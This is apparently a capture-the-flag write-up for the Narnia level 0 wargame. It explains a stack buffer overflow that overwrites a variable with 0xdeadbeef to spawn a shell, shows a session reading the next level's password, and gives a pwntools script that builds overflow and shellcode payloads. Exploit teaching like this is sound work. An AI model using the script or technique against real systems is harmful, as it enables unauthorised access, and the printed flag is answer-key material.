## 0 -> 1

### Writeup 
I began by looking at the source code in `narnia0.c`. The purpose of the program is to spawn a shell only if `val == 0xdeadbeef`, but `val` isn’t a user-controlled variable.

The vulnerability is a stack-based buffer overflow, enabled by the program reading 24 bytes of user input into a 20-byte buffer, with the buffer defined after `val`. With a payload of 20 rubbish bytes followed by `0xdeadbeef`, we can rewrite the value in `val` to be `0xdeadbeef`, which is the condition needed to spawn a shell as the user `narnia1`.

With this user, we can view the flag stored in `/etc/narnia_pass/narnia1`.

```
narnia0@narnia:/tmp/tmp.JOX81HnqnZ$ python3 script.py 20x 0xdeadbeef /narnia/narnia0
[+] Starting local process '/narnia/narnia0': pid 860
[*] Switching to interactive mode
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA...
val: 0xdeadbeef
$ whoami
narnia1
$ cat /etc/narnia_pass/narnia1
O8dJypubLr
$
```

<details>
  <summary>Flag</summary>O8dJypubLr
</details>


### Script

```python
import sys
import subprocess
from pwn import *

binary = ""
payload = b""

for arg in sys.argv[1:]:
    # garbage/filler bytes
    if arg.endswith("x"):
        for i in range(int(arg.split("x")[0])):
            payload += "A".encode()
    # inputting an address
    elif arg.startswith("0x"):
        payload += int(arg, 16).to_bytes(4, "little")
    # file to run
    elif arg.startswith("./") or arg.startswith("/"):
        binary = arg
    # shellcode
    elif arg is "shell":
        payload += asm(shellcraft.sh())
    else:
        try:
            payload += int(arg).to_bytes(4, "little")
        except:
            payload += arg.encode()

process = process(binary)
process.sendline(payload)
process.interactive()
```